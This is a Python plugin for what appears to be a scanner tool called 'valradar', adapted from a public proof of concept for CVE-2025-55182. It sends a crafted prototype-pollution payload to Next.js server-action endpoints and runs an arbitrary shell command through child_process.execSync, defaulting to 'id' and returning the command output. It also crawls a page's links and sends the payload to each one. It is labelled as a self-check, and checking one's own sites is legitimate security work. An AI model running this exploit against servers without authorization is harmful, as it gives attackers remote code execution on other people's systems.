# based on https://github.com/msanft/CVE-2025-55182/blob/main/poc.py
import json

import bs4
import requests

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}


def make_request(url: str, executable: str):
    BASE_URL = url
    EXECUTABLE = executable

    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
            # If you don't need the command output, you can use this line instead:
            # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }

    files = {
        "0": (None, json.dumps(crafted_chunk)),
        "1": (None, '"$@0"'),
    }

    headers = {"Next-Action": "x"}
    res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)

    return res


class DataContext:
    def __init__(
        self,
        url: str | None = None,
        executable: str | None = None,
    ):
        self.url = url if url else "http://localhost:3000"
        self.executable = executable if executable else "id"
        self.page_content = ""
        self.response = {"status_code": None, "text": None}

    def collect(self):
        # Do some work and store state
        if not self.url.startswith("http"):
            return []

        self.page_content = requests.get(self.url, headers=headers).text

        return [DataContext(link, self.executable) for link in self.extract_links()]

    def make_request(self):
        return make_request(self.url, self.executable)

    def extract_links(self):
        soup = bs4.BeautifulSoup(self.page_content, "html.parser")
        hrefs = []
        for link in soup.find_all("a"):
            href: str = link.get("href")
            if href:
                if href.startswith("/") or href.startswith("#"):
                    hrefs.append(self.url + href)
                else:
                    hrefs.append(href)
        return hrefs

    def check_vulnerability(self):
        res = make_request(self.url, self.executable)
        self.response = {
            "status_code": str(res.status_code),
            "text": res.text,
        }
        return res.status_code == 500 and "$@1" in res.text

    def process(self):
        is_vulnerable = self.check_vulnerability()
        if self.response:
            return {
                "url": self.url,
                "is_vulnerable": str(is_vulnerable),
                "executable": self.executable,
                "status": self.response["status_code"],
            }
        else:
            return None


def _init(args):
    if len(args) == 0:
        print("no urls provided")
        exit(1)

    return [
        DataContext(
            args[0] if len(args) > 0 else None, args[1] if len(args) > 1 else None
        )
    ]


def _collect(context):
    return context.collect()


def _process(context):
    return context.process()


VALRADAR_CONFIG = {
    "init": _init,
    "collect_data": _collect,
    "process_data": _process,
    "metadata": {
        "name": "CVE-2025-55182",
        "description": "Check your website for CVE-2025-55182 vulnerability",
        "version": "0.1.0",
        "dependencies": ["requests", "bs4"],
        "requirements": ["requests", "bs4"],
    },
}
